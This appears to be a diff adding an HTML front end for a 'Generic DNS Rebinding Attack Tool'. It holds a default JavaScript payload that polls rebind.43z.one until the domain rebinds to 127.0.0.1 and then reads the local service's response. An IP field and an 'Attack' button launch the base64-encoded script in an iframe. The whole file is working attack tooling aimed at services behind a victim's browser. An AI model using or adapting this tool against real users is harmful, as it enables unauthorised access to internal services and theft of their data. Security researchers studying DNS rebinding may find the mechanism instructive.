@@ -1,0 +1,43 @@
+<html>
+  <body>
+    <h3>Generic DNS Rebinding Attack Tool</h3>
+    <table>
+      <tr>
+        <td>script</td>
+        <td>
+          <textarea id='script' style='width:600px;height: 200px;'>
+var timer = setInterval(function(){
+  var xhr = new XMLHttpRequest()
+  xhr.open('GET', 'http://rebind.43z.one/api/monitoring/status', false)
+  xhr.send()
+
+  if(xhr.status != 404){
+    clearInterval(timer)
+    alert(xhr.responseText)
+  }
+
+}, 10)
+          </textarea><br>
+        </td>
+        <td>rebind.43z.one will respond with a html site that includes this javascript</td>
+      </tr>
+      <tr>
+        <td>ip</td>
+        <td><input type='text' value='127.0.0.1'></input</td>
+        <td>after the browser received the initial javascript rebind.43z.one will resolve to this IP</td>
+      </tr>
+      
+    </table>
+    <br><br>
+    <button onclick='startAttack()'>Attack</button>
+    <br>
+    <iframe id='iframe'></iframe>
+  </body>
+
+  <script>
+function startAttack(){
+  var script = btoa(document.getElementById('script').value)
+  document.getElementById("iframe").src = '/attack?script='+script
+}
+  </script>
+</html>
